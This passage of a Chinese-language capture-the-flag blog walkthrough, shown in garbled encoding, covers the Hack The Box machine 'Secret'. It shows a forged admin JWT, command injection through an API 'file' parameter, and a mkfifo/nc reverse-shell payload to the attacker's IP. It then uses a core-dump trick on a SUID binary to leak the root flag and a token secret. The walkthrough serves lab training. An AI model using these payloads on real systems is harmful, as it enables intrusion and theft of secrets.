â””â”€# curl http://secret.htb/api/priv -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;creds&quot;:{&quot;role&quot;:&quot;admin&quot;,&quot;username&quot;:&quot;theadmin&quot;,&quot;desc&quot;:&quot;welcome back admin&quot;}}
</code></pre>
<p>æˆ‘ä»¬å»éªŒè¯ä¸€ä¸‹æ–°çš„JWTä»¤ç‰Œï¼Œå‘ç°å·²ç»æ˜¯adminæƒé™äº†</p>
<p>é€šè¿‡åˆ†æprivate.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°å¿…é¡»å°†æ–‡ä»¶åæŒ‡å®šä¸ºå¸¦æœ‰åç§°æ–‡ä»¶çš„getå‚æ•°</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
â””â”€# curl &#39;http://secret.htb/api/logs?file=/etc/passwd&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;killed&quot;:false,&quot;code&quot;:128,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline /etc/passwd&quot;}
</code></pre>
<p>çœ‹ç€æ„Ÿè§‰åƒæ˜¯å‘½ä»¤æ³¨å…¥ï¼Ÿ</p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a><strong>æ¼æ´åˆ©ç”¨</strong></h2><pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
â””â”€# curl &#39;http://secret.htb/api/logs?file=;id&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
&quot;80bf34c fixed typos ğŸ‰\n0c75212 now we can view logs from server ğŸ˜ƒ\nab3e953 Added the codes\nuid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n&quot;
</code></pre>
<p>OKï¼Œç¡®è®¤æ¼æ´æ˜¯å­˜åœ¨çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨å…ˆä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£</p>
<pre><code class="Plain">nc -nvlp 4444
</code></pre>
<p>ç„¶åæ¥ç€æ„é€ ä¸€ä¸ªpayloadæ¥è¿›è¡Œåˆ©ç”¨</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/dump/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/routes]
â””â”€# curl &#39;http://secret.htb/api/logs?file=;rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+10.10.14.12+4444+%3E%2Ftmp%2Ff%0A%0A&#39; -H &#39;auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWFkYWNmZjMxNDY0ZjA0NWZkYWYzMjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imx1Y2lmaWVsQGx1Y2lmaWVsLmNvbSIsImlhdCI6MTYzODc3MjEzNn0.FM3CbCKxrJ79hXwF02Rg3jsi5bpNeg1txPyb2nWbAA0&#39;
{&quot;killed&quot;:false,&quot;code&quot;:1,&quot;signal&quot;:null,&quot;cmd&quot;:&quot;git log --oneline ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.12 4444 &gt;/tmp/f\n\n&quot;}
</code></pre>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.120] 40314
/bin/sh: 0: can&#39;t access tty; job control turned off
$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;;
dasith@secret:~/local-web$ whoami&amp;&amp;id
whoami&amp;&amp;id
dasith
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
</code></pre>
<p>æˆåŠŸè·å–åˆ°ä¸€ä¸ªshell</p>
<pre><code class="Plain">dasith@secret:~/local-web$ cd
cd
dasith@secret:~$ ls
ls
local-web  user.txt
dasith@secret:~$ cat user.txt
cat user.txt
2b3b6e0a590097b69da4de9631b570fd
</code></pre>
<p>æˆåŠŸè·å–åˆ°useræƒé™çš„flagæ–‡ä»¶</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a><strong>æƒé™æå‡</strong></h2><p>æŸ¥çœ‹ä¸€ä¸‹å½“å‰çš„å¯æ‰§è¡Œæ–‡ä»¶</p>
<pre><code class="Plain">find / -type f -perm -u=s 2&gt;/dev/null
</code></pre>
<pre><code class="Plain">dasith@secret:~$ find / -type f -perm -u=s 2&gt;/dev/null
find / -type f -perm -u=s 2&gt;/dev/null
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/opt/count
/snap/snapd/13640/usr/lib/snapd/snap-confine
/snap/snapd/13170/usr/lib/snapd/snap-confine
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core18/1944/bin/mount
/snap/core18/1944/bin/ping
/snap/core18/1944/bin/su
/snap/core18/1944/bin/umount
/snap/core18/1944/usr/bin/chfn
/snap/core18/1944/usr/bin/chsh
/snap/core18/1944/usr/bin/gpasswd
/snap/core18/1944/usr/bin/newgrp
/snap/core18/1944/usr/bin/passwd
/snap/core18/1944/usr/bin/sudo
/snap/core18/1944/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1944/usr/lib/openssh/ssh-keysign
</code></pre>
<p>è·å–åˆ°äº†ä¸€äº›å¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶</p>
<p>æˆ‘ä»¬æŠŠç›®å…‰ç€çœ¼æ”¾åœ¨<code>/opt/count</code>ä¸Š</p>
<pre><code class="Plain">dasith@secret:/opt$ cat code.c
cat code.c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;dirent.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;linux/limits.h&gt;

void dircount(const char *path, char *summary)
{
 Â   DIR *dir;
 Â   char fullpath[PATH_MAX];
 Â   struct dirent *ent;
 Â   struct stat fstat;

 Â   int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

 Â   if((dir = opendir(path)) == NULL)
 Â   {
 Â  Â  Â   printf(&quot;\nUnable to open directory.\n&quot;);
 Â  Â  Â   exit(EXIT_FAILURE);
 Â   }
 Â   while ((ent = readdir(dir)) != NULL)
 Â   {
 Â  Â  Â   ++tot;
 Â  Â  Â   strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
 Â  Â  Â   strcat(fullpath, &quot;/&quot;);
 Â  Â  Â   strncat(fullpath, ent-&gt;d_name, strlen(ent-&gt;d_name));
 Â  Â  Â   if (!lstat(fullpath, &amp;fstat))
 Â  Â  Â   {
 Â  Â  Â  Â  Â   if(S_ISDIR(fstat.st_mode))
 Â  Â  Â  Â  Â   {
 Â  Â  Â  Â  Â  Â  Â   printf(&quot;d&quot;);
 Â  Â  Â  Â  Â  Â  Â   ++directories;
 Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â   else if(S_ISLNK(fstat.st_mode))
 Â  Â  Â  Â  Â   {
 Â  Â  Â  Â  Â  Â  Â   printf(&quot;l&quot;);
 Â  Â  Â  Â  Â  Â  Â   ++symlinks;
 Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â   else if(S_ISREG(fstat.st_mode))
 Â  Â  Â  Â  Â   {
 Â  Â  Â  Â  Â  Â  Â   printf(&quot;-&quot;);
 Â  Â  Â  Â  Â  Â  Â   ++regular_files;
 Â  Â  Â  Â  Â   }
 Â  Â  Â  Â  Â   else printf(&quot;?&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IRUSR) ? &quot;r&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IWUSR) ? &quot;w&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IXUSR) ? &quot;x&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IRGRP) ? &quot;r&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IWGRP) ? &quot;w&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IXGRP) ? &quot;x&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IROTH) ? &quot;r&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IWOTH) ? &quot;w&quot; : &quot;-&quot;);
 Â  Â  Â  Â  Â   printf((fstat.st_mode &amp; S_IXOTH) ? &quot;x&quot; : &quot;-&quot;);
 Â  Â  Â   }
 Â  Â  Â   else
 Â  Â  Â   {
 Â  Â  Â  Â  Â   printf(&quot;??????????&quot;);
 Â  Â  Â   }
 Â  Â  Â   printf (&quot;\t%s\n&quot;, ent-&gt;d_name);
 Â   }
 Â   closedir(dir);

 Â   snprintf(summary, 4096, &quot;Total entries Â  Â  Â  = %d\nRegular files Â  Â  Â  = %d\nDirectories Â  Â  Â  Â  = %d\nSymbolic links Â  Â   = %d\n&quot;, tot, regular_files, directories, symlinks);
 Â   printf(&quot;\n%s&quot;, summary);
}

void filecount(const char *path, char *summary)
{
 Â   FILE *file;
 Â   char ch;
 Â   int characters, words, lines;

 Â   file = fopen(path, &quot;r&quot;);

 Â   if (file == NULL)
 Â   {
 Â  Â  Â   printf(&quot;\nUnable to open file.\n&quot;);
 Â  Â  Â   printf(&quot;Please check if file exists and you have read privilege.\n&quot;);
 Â  Â  Â   exit(EXIT_FAILURE);
 Â   }

 Â   characters = words = lines = 0;
 Â   while ((ch = fgetc(file)) != EOF)
 Â   {
 Â  Â  Â   characters++;
 Â  Â  Â   if (ch == &#39;\n&#39; || ch == &#39;\0&#39;)
 Â  Â  Â  Â  Â   lines++;
 Â  Â  Â   if (ch == &#39; &#39; || ch == &#39;\t&#39; || ch == &#39;\n&#39; || ch == &#39;\0&#39;)
 Â  Â  Â  Â  Â   words++;
 Â   }

 Â   if (characters &gt; 0)
 Â   {
 Â  Â  Â   words++;
 Â  Â  Â   lines++;
 Â   }

 Â   snprintf(summary, 256, &quot;Total characters = %d\nTotal words Â  Â   = %d\nTotal lines Â  Â   = %d\n&quot;, characters, words, lines);
 Â   printf(&quot;\n%s&quot;, summary);
}

int main()
{
 Â   char path[100];
 Â   int res;
 Â   struct stat path_s;
 Â   char summary[4096];

 Â   printf(&quot;Enter source file/directory name: &quot;);
 Â   scanf(&quot;%99s&quot;, path);
 Â   getchar();
 Â   stat(path, &amp;path_s);
 Â   if(S_ISDIR(path_s.st_mode))
 Â  Â  Â   dircount(path, summary);
 Â   else
 Â  Â  Â   filecount(path, summary);

 Â   // drop privs to limit file write
 Â   setuid(getuid());
 Â   // Enable coredump generation
 Â   prctl(PR_SET_DUMPABLE, 1);
 Â   printf(&quot;Save results a file? [y/N]: &quot;);
 Â   res = getchar();
 Â   if (res == 121 || res == 89) {
 Â  Â  Â   printf(&quot;Path: &quot;);
 Â  Â  Â   scanf(&quot;%99s&quot;, path);
 Â  Â  Â   FILE *fp = fopen(path, &quot;a&quot;);
 Â  Â  Â   if (fp != NULL) {
 Â  Â  Â  Â  Â   fputs(summary, fp);
 Â  Â  Â  Â  Â   fclose(fp);
 Â  Â  Â   } else {
 Â  Â  Â  Â  Â   printf(&quot;Could not open %s for writing\n&quot;, path);
 Â  Â  Â   }
 Â   }

 Â   return 0;
}
</code></pre>
<p>è¿™æ˜¯countçš„æºç ï¼Œé€šè¿‡åˆ†æåå¾—çŸ¥</p>
<p>è¿™é‡Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æ‰§è¡Œä»£ç ä¸­å´©æºƒäº†ï¼ŒæŠ¥å‘Šé€šå¸¸ä¼šä¿å­˜åœ¨<code>/var/crash</code>ä¸­</p>
<p>åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½†æ˜¯é€šè¿‡è¿™ä¸ªpemè®¾ç½®<code>prctl(PR_SET_DUMPABLE, 1);</code>ï¼Œå®ƒå¯ä»¥è¢«å®ç°</p>
<p>ç”±äºå®ƒè®¾ç½®ä¸º1ï¼Œæˆ‘ä»¬å¯ä»¥äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨ï¼Œåˆ©ç”¨çš„è¯éœ€è¦ä¸¤ä¸ªæ¡ä»¶</p>
<ol>
<li>é¦–å…ˆéœ€è¦ç¡®ä¿æœ‰ä¸¤ä¸ªshell</li>
<li>å¯ä»¥å¯¼è‡´å´©æºƒ</li>
</ol>
<p>ç°åœ¨è®©æˆ‘ä»¬å»ç”¨ä¸Šé¢æ¼æ´åˆ©ç”¨çš„æ–¹å¼å†è·å–ä¸€ä¸ªshell</p>
<h3 id="Shell-1"><a href="#Shell-1" class="headerlink" title="Shell 1"></a><strong>Shell 1</strong></h3><pre><code class="Plain">dasith@secret:/$ cd /opt
cd /opt
dasith@secret:/opt$ ./count -p
./count -p
Enter source file/directory name: /root/root.txt
/root/root.txt

Total characters = 33
Total words Â  Â   = 2
Total lines Â  Â   = 2
Save results a file? [y/N]: y
y
</code></pre>
<p>æ‰§è¡Œåå»shell 2è®©è¿›ç¨‹å´©æºƒ</p>
<h3 id="Shell-2"><a href="#Shell-2" class="headerlink" title="Shell 2"></a><strong>Shell 2</strong></h3><pre><code class="Plain">dasith@secret:~/local-web$ cd /opt
cd /opt
dasith@secret:/opt$ ps -aux | grep count
ps -aux | grep count
root Â  Â  Â  Â  862  0.0  0.1 235672  7480 ? Â  Â  Â   Ssl  06:15 Â  0:00 /usr/lib/accountsservice/accounts-daemon
root Â  Â  Â   1342  0.0  0.0 Â  2488 Â  516 ? Â  Â  Â   S Â   06:50 Â  0:00 ./count
root Â  Â  Â   1435  0.0  0.0 Â  2488 Â  588 ? Â  Â  Â   S Â   06:54 Â  0:00 ./count
dasith Â  Â   1460  0.0  1.0  52448 41712 ? Â  Â  Â   S Â   07:00 Â  0:00 gdb ./count
dasith Â  Â   1462  0.0  0.0 Â  2488 Â  600 ? Â  Â  Â   S Â   07:00 Â  0:00 /opt/count
root Â  Â  Â   1850  0.0  0.0 Â  2488 Â  592 pts/0 Â   S+ Â  07:41 Â  0:00 ./count -p
dasith Â  Â   1885  0.0  0.0 Â  2488 Â  524 pts/4 Â   S+ Â  07:43 Â  0:00 ./count -p
dasith Â  Â   1887  0.0  0.0 Â  6432 Â  740 pts/2 Â   S+ Â  07:44 Â  0:00 grep --color=auto count
dasith@secret:/opt$ kill -BUS 1885
kill -BUS 1885
</code></pre>
<p>ç„¶åå†å»shell1æ£€æŸ¥è¿›ç¨‹æ˜¯å¦å´©æºƒ</p>
<h3 id="Shell-1-ç¬¬äºŒæ¬¡"><a href="#Shell-1-ç¬¬äºŒæ¬¡" class="headerlink" title="Shell 1 ç¬¬äºŒæ¬¡"></a><strong>Shell 1 ç¬¬äºŒæ¬¡</strong></h3><pre><code class="Plain">Path: Bus error (core dumped)
</code></pre>
<p>å·²ç»çœ‹åˆ°è¿™å¥æç¤ºäº†ï¼Œä½†ä½œä¸ºä¿é™©æˆ‘ä»¬è¿˜æ˜¯å†éªŒè¯ä¸€æ¬¡</p>
<pre><code class="Plain">dasith@secret:/opt$ cd /var/crash
cd /var/crash
dasith@secret:/var/crash$ ls -la
ls -la
total 36
drwxrwxrwt  2 root Â  root Â   4096 Dec  6 07:44 .
drwxr-xr-x 14 root Â  root Â   4096 Aug 13 05:12 ..
-rw-r-----  1 dasith dasith 28207 Dec  6 07:44 _opt_count.1000.crash
</code></pre>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å·²ç»ç”Ÿæˆäº†é”™è¯¯æ—¥å¿—äº†ï¼Œæ–°å»ºä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ç›®å½•ï¼Œç„¶åæŠŠæ–‡ä»¶æ‹·è´è¿‡å»</p>
<pre><code class="Plain">dasith@secret:/var/crash$ mkdir /tmp/lucifiel
mkdir /tmp/lucifiel
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/lucifiel
apport-unpack _opt_count.1000.crash /tmp/lucifiel
dasith@secret:/var/crash$ cd /tmp/lucifiel
cd /tmp/lucifiel
dasith@secret:/tmp/lucifiel$ ls -la
ls -la
total 436
drwxr-xr-x  2 dasith dasith Â  4096 Dec  6 07:51 .
drwxrwxrwt 13 root Â  root Â  Â  4096 Dec  6 07:49 ..
-rw-r--r--  1 dasith dasith Â  Â   5 Dec  6 07:51 Architecture
-rw-r--r--  1 dasith dasith 380928 Dec  6 07:51 CoreDump
-rw-r--r--  1 dasith dasith Â  Â  24 Dec  6 07:51 Date
-rw-r--r--  1 dasith dasith Â  Â  12 Dec  6 07:51 DistroRelease
-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ExecutablePath
-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ExecutableTimestamp
-rw-r--r--  1 dasith dasith Â  Â   5 Dec  6 07:51 ProblemType
-rw-r--r--  1 dasith dasith Â  Â  10 Dec  6 07:51 ProcCmdline
-rw-r--r--  1 dasith dasith Â  Â   4 Dec  6 07:51 ProcCwd
-rw-r--r--  1 dasith dasith Â  Â  53 Dec  6 07:51 ProcEnviron
-rw-r--r--  1 dasith dasith Â  2144 Dec  6 07:51 ProcMaps
-rw-r--r--  1 dasith dasith Â  1336 Dec  6 07:51 ProcStatus
-rw-r--r--  1 dasith dasith Â  Â   1 Dec  6 07:51 Signal
-rw-r--r--  1 dasith dasith Â  Â  29 Dec  6 07:51 Uname
-rw-r--r--  1 dasith dasith Â  Â   3 Dec  6 07:51 UserGroups
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªCoreDumpæ–‡ä»¶ï¼Œæˆ‘ä»¬å°†å…¶ä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡º</p>
<pre><code class="Plain">dasith@secret:/tmp/lucifiel$ strings CoreDump
strings CoreDump
CORE
CORE
count
./count -p
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
////////////////
Path:
Could
LINUX
////////////////
Path:
Could
TUUU
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
fclose
opendir
getuid
strncat
__cxa_finalize
__libc_start_main
snprintf
__xstat
__lxstat
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Unable to open directory.
??????????
Total entries Â  Â  Â  = %d
Regular files Â  Â  Â  = %d
Directories Â  Â  Â  Â  = %d
Symbolic links Â  Â   = %d
Unable to open file.
Please check if file exists and you have read privilege.
Total characters = %d
Total words Â  Â   = %d
Total lines Â  Â   = %d
Enter source file/directory name:
%99s
Save results a file? [y/N]:
Path:
Could not open %s for writing
:*3$&quot;
Path: esults a file? [y/N]: words Â  Â   = 2
Total lines Â  Â   = 2
oot/root.txt
1bf72c039cbd58751b38c6916602f537
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
uTi7J
|F:m
_rtld_global
__get_cpu_features
_dl_find_dso_for_object
_dl_make_stack_executable
_dl_exception_create
__libc_stack_end
_dl_catch_exception
malloc
_dl_deallocate_tls
_dl_signal_exception
__tunable_get_val
__libc_enable_secure
__tls_get_addr
_dl_get_tls_static_info
calloc
_dl_exception_free
_dl_debug_state
_dl_argv
_dl_allocate_tls_init
_rtld_global_ro
realloc
_dl_rtld_di_serinfo
_dl_mcount
_dl_allocate_tls
_dl_signal_error
_dl_exception_create_format
_r_debug
_dl_catch_error
ld-linux-x86-64.so.2
GLIBC_2.2.5
GLIBC_2.3
GLIBC_2.4
GLIBC_PRIVATE
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/haswell/avx512_1/x86_64/tls/haswell/x86_64/tls/avx512_1/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
%%%%%%%%%%%%%%%%
////////////////
ory name:
%99s
/root/root.txt
Total characters = 33
Total words Â  Â   = 2
Total lines Â  Â   = 2
cI,b
x86_64
./count
SHELL=/bin/sh
versioning=[object Object]
unstable_restarts=0
treekill=true
env=[object Object]
filter_env=
namespace=default
restart_time=0
DB_CONNECT=mongodb://127.0.0.1:27017/auth-web
axm_options=[object Object]
vizion_running=false
PWD=/opt
LOGNAME=dasith
PM2_USAGE=CLI
exec_interpreter=node
PM2_HOME=/home/dasith/.pm2
HOME=/home/dasith
NODE_APP_INSTANCE=0
LANG=en_US.UTF-8
LS_COLORS=
pm_id=0
version=1.0.0
pm_uptime=1638771355228
km_link=false
pm_cwd=/home/dasith/local-web
axm_monitor=[object Object]
instance_var=NODE_APP_INSTANCE
pmx=true
unique_id=340d74ce-a3fa-4484-a533-bfcb827fe92c
LESSCLOSE=/usr/bin/lesspipe %s %s
vizion=true
username=dasith
LESSOPEN=| /usr/bin/lesspipe %s
watch=false
windowsHide=true
automation=true
axm_actions=
SHLVL=1
TOKEN_SECRET=gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
PM2_INTERACTOR_PROCESSING=true
created_at=1633619800035
merge_logs=true
pm_pid_path=/home/dasith/.pm2/pids/index-0.pid
PATH=/usr/bin:/bin
pm_err_log_path=/home/dasith/.pm2/logs/index-error.log
node_version=10.19.0
kill_retry_time=100
autorestart=true
axm_dynamic=[object Object]
node_args=
exec_mode=fork_mode
pm_exec_path=/home/dasith/local-web/index.js
OLDPWD=/
status=launching
name=index
pm_out_log_path=/home/dasith/.pm2/logs/index-out.log
_=./count
./count
bemX
__vdso_gettimeofday
__vdso_time
__vdso_clock_gettime
__vdso_clock_getres
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
AUATS
A\A]]
[A\M
A]]I
[A\]
[A\]
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
</code></pre>
<pre><code class="Plain">oot/root.txt
1bf72c039cbd58751b38c6916602f537
</code></pre>
<p>ä»ä¸­è·å–åˆ°äº†rootæƒé™çš„flagæ–‡ä»¶</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="å¾®åš">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="å¾®ä¿¡">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&title=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&source=Lucifiel æŠ€æœ¯åšå®¢" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=ã€ŠSecret - Hacktheboxã€‹ â€” Lucifiel's Blog&url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/12/06/Hackthebox/Easy/Hackthebox-Secret/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/12/16/Hackthebox/Medium/Hackthebox-Unicode/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Unicode - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/12/03/Hackthebox/Medium/Hackthebox-Shibboleth/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Shibboleth - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
